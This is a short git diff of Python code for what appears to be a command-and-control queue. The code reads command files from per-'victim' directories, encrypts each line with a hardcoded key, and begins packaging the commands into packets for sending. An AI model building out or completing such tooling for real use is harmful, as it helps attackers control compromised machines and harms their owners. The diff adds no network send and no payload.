@@ -3,6 +3,7 @@
 from threading import Timer
 # from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
 from utils.encrypt import Encrypter
+from ..bundler.bundler import Bundler
 
 import math
 import os
@@ -30,14 +31,13 @@ class CommandQueue():
         # if self.can_watch:
         #     Timer(3, self._watch).start()
 
-        print('yeet')
-
         # Refresh victim dirs
         self.victim_dirs = self._get_victim_dirs()
 
         # Iterate over directories and read command file
         for dir in self.victim_dirs:
             if os.path.isfile(dir + '/input/' + self.command_file):
+                bundler = Bundler() # TODO: Pass in victim packet
                 with open(dir + '/input/' + self.command_file, 'r') as f:
                     commands = []
                     for line in f:
@@ -46,6 +46,10 @@ class CommandQueue():
                         commands.append(Encrypter(line, 'secret').encrypt())
 
                     # Prepare for transmission
+                    for cmd in commands:
+                        pkt = bundler.build_command_pkt(cmd)
+
+                        # Send the packet
 
                 # os.remove(dir + '/input/' + self.command_file) # Done reading file
 
